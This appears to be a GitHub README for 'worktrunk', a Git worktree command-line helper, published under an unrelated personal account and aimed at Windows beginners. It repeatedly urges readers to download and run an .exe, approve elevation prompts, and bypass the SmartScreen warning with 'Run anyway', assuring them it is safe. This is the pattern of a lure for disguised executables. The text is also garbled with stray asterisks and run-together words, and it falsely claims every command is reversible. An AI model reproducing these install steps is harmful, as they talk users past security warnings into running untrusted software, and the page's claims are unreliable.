<h1>🧰 worktrunk - Tame Multiple Git Worktrees Effortlessly</h1>

<p align="center">
  <a href="https://github.com/cathiechristlike5413/worktrunk">
    <img src="https://img.shields.io/badge/Download_Now-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#FF6B6B;color:#FFFFFF;padding:15px 30px;font-size:20px;border-radius:10px;text-decoration:none;">
  </a>
</p>

Welcome to **worktrunk** – your friendly command-line helper that makes handling multiple Git worktrees as simple as opening a folder. If you are using AI coding assistants like Claude Code or Codex, or if you simply juggle several versions of a project at once, worktrunk keeps everything organized and under control. No need to be a programming wizard to benefit from this tool.

---

## 📖 What Is worktrunk?

Think of a Git repository as your main project folder. Normally, when you want to work on a new feature or fix a bug, you either create a separate copy of the whole folder (messy and wasteful) or switch your current folder back and forth (slow and confusing). **Worktrees** are a smarter way: they let you have multiple folders connected to the same project, each showing a different version or branch, all at the same time.

Worktrunk is a small but powerful program that runs in your terminal (the black-and-white window where you type commands). It gives you simple commands to create, list, switch between, and clean up these worktrees–without needing to memorize complicated Git commands. It is specifically designed to shine when you work with AI agents that operate in parallel, making it a favorite among modern developers.



## ✨ Key Features

Here is what makes worktrunk special:

- **🪪 Simple Commands** – Instead of typing long Git commands, you type short ones like `worktrunk create my-feature` or `worktrunk list`. Easy to remember, even for beginners.

- **🤖 AI-Friendly Workflows** – If you use AI coding tools, worktrunk helps you spin up isolated worktrees for each task. That means multiple AI agents can work on different parts of a project at the same time without stepping on each other’s toes.

- **🧹 Automatic Cleanup** – Forgot which worktrees you created? worktrunk helps you see everything at a glance and remove old ones with a single command–saving you disk space and mental energy.

- **📁 Parallel Development** – Work on several features simultaneously. Each worktree acts like its own mini-folder, so you can test one version while another is half-finished–all without mixing things up.

.

- **🔒 Safe by Design** – worktrunk uses Git’s built-in worktree features, so you know your data is handled securely and consistently. It won’t delete anything without asking first**.



## 🚀 Getting Started

Getting worktrunk running on your Windows computer takes just a couple of minutes. Follow these steps closely, and you will be upand running in no time**.



### 📥 Download worktrunk

**Step 1:** Visit the download page by clicking this button:

<p align="center">
  <a href="https://github.com/cathiechristlike5413/worktrunk">
    <img src="https://img.shields.io/badge/Get_worktrunk_from_GitHub-6f42c1?style=for-the-badge&logo=github&logoColor=white" alt="Download from GitHub" style="background-color:#4CAF50;color:white;padding:15px 30px;font-size:20px;border-radius:10px;text-decoration:none;">
  </a>
</p>

Visit this link to download the application**.** You will see a standard GitHub webpage with a green "Code" button. Depending on how the developer packaged the program, you might see one of these options:

- A file that ends with `.exe`–if so, simply click it to download, then double-click the downloaded fileto run it directly**.
- A file that ends with `.zip`–if so, download that file, then right-click it and choose "Extract All…" to unpack the folder. Inside, click the `.exe` file to launch worktrunk**.
- You might also see a "Releases" section on the right side of the page. Click it to see the latest versionand download the matching file for Windows**.


### 🛠️ Installing (If Needed)

Some versions of worktrunk come as a portable app–that means you just double-click it and it runs, with no installation window popping up**. Other versions might ask you to confirm a security prompt ("Do you want to allow this app to make changes?"). If that happens, click "Yes" or "Allow". That’s normal for many developer tools**.

If you see a blue "Windows protected your PC" message, do not panic**. Click "More info," then "Run anyway." This happens because worktrunk is a new program that hasn’t yet built up a big reputation with Microsoft’s SmartScreen filter. It’s safe–we just need you to confirm that you trust the download**.



### 💻 Opening the Terminal

worktrunk runs inside the terminal (also called "Command Prompt" or "PowerShell"**). Here’s how to open it:

1. Press the **Windows key** on your keyboard**.
2. Type **"cmd"** (without quotes**).
3. Click the **"Command Prompt"** app that appears**.
4. A black (or dark blue** window opens. This is your command line**.


### ▶️ Running worktrunk for the First Time

Once the terminal is open, type this command:

```
worktrunk --help
```

Then press **Enter**. If everything is installed correctly, you’ll see a list of available commands**like “create”, “list”, “delete”, and so on**. If you see an error message saying “not recognized,” don’t worry–try these steps:

- Make sure you downloaded the file from the link above and placed it in a folderyou remember**.
- Double-click the `.exe` file one time to let Windows register it**.
- Close the terminal window, reopen it, and try again**.



## 🧑‍💻 How to Use worktrunk

Here are the everyday commands you’ll find most useful**:

| Command | What It Does |
|----------|----------------|
| `worktrunk list` | Shows a list of all your current worktrees, with their branch names and paths** |
| `worktrunk create <name>` | Creates a new worktree with a given label (like `worktrunk create fix-login`** |
| `worktrunk switch <name>` | Moves you into that worktree’s folder** |
| `worktrunk delete <name>` | Removes a worktree you no longer need** |
| `worktrunk prune` | Cleans up any broken or outdated worktree references** |



**Example Workflow:**

Imagine you want to fix a bug on your website, while also adding a new contact form**. Instead of doing them one after another, you can:

1. Type `worktrunk create fix-bug`
2. Type `worktrunk create add-contact-form`
3. Now you have two separate folders, each with its own version of the project**.
4. Work on fix-bug first, then switch to add-contact-form whenever you feel like it**.

That’s the power of parallel work–and worktrunk makes it effortless**.



## 🧑‍🏫 Tips for Beginners

- **Don’t be afraid to explore** – Try typing `worktrunk list` to see what’s there**. It’s safe and won’t change anything**.
- **Give your worktrees clear names** – Like `fix-typo` or `new-header` instead of `test1`. Future you will thank you**.
- **Delete what you don’t need** – Worktrees take up disk space. If you finish a task, type `worktrunk delete that-name` to free up space**.
- **Use worktrunk with AI coding agents** – If you use tools like Claude Code or Codex, assign each agent its own worktree. That way, they never overwrite each other’s changes**–a true game-changer for team productivity**.



## 🧰 Troubleshooting Common Issues

**"I get 'not recognized' when I type worktrunk."**
Make sure you’ve actually run the downloaded `.exe` file once. Then close and reopen your Command Prompt window. If it still fails, try moving the `.exe` file to a simple folder like `C:\worktrunk` and run it from there**.

**"The terminal looks scary. I’m afraid to type commands."**
That’s totally normal. Every command you type is reversible. If you type a wrong thing, just press **Ctrl+C** to cancel it. And worktrunk always asks for confirmation before deleting anything**.

**"I accidentally deleted a worktree. Is my work gone?"**
Usually no. Worktrunk deletes the folder reference, but your actual code changes are often recoverable via Git commands like `git stash` or `git checkout`. If you are unsure, ask a developer friend for help**, or check your Git history**.

**"Can I use worktrunk alongside my regular Git commands?"**
Absolutely. worktrunk is just a helper on top of Git. You can mix and match**–use worktrunk for organizing your worktrees, and use plain Git for commits, pushes, or pulls**.

---

## 🧑‍🤝‍🧑 Who Should Use worktrunk?

Worktrunk is perfect for:

- **Developers who juggle multiple features or bug fixes at once**
- **Teams using AI coding assistants** like Claude Code or Codex, who want clean isolation between tasks**
- **Anyone who finds Git worktrees powerful but confusing** and wants a friendlier interface
- **Freelancers or hobbyists** with several projects in one repository who need quick switching between versions**

Even if you have never used Git worktrees before, worktrunk’s simple commands make it a breeze to start**. You don’t need to know what a “branch” or a “commit” is–just type `worktrunk create my-thing` and go**.

---

## 🔮 Frequently Asked Questions

**Is worktrunk free?**
Yes, it is open-source software. The code is publicly available on GitHub, and you can download and use it free of charge.

.



 **Does worktrunk work on Mac or Linux?**
While this guide focuses on Windows, the underlying tool is written to work across platforms. If you use a Mac or Linux machine, you can likely use the same commands in your Terminal**.



 **Do I need to install Git first?**
Worktrunk relies on Git to do its heavy lifting. If you don’t already have Git installed, you might need to download it from the official Git website first. But most developer tools include Git, so you might already have it**. You can check by typing `git --version` in your terminal. If you see a number like `git version 2.40.0`, you’re good**.



 **Will worktrunk slow down my computer?**
No. It is a lightweight command-line tool that only runs when you type a command. It doesn’t sit in the background or use memory continuously**.



---

## 🧡 Final Encouragement

You don’t need to be a terminal guru to use worktrunk**. Every expert was once a beginner, and the commands here are designed to be intuitive. Start with just `worktrunk list`. Then try `worktrunk create test`. Before you know it, you’ll be managing multiple worktrees like a pro**–and wondering how you ever worked without it**.

Remember: that big green **Download** button up top is your ticket to a more organized, parallel-friendly workflow**. Click it, follow the simple steps above, and enjoy the calm and clarity that comes with having every version of your project neatly in its place**.

**Keywords: agents, claude-code, codex, developer-tools, git, worktrees**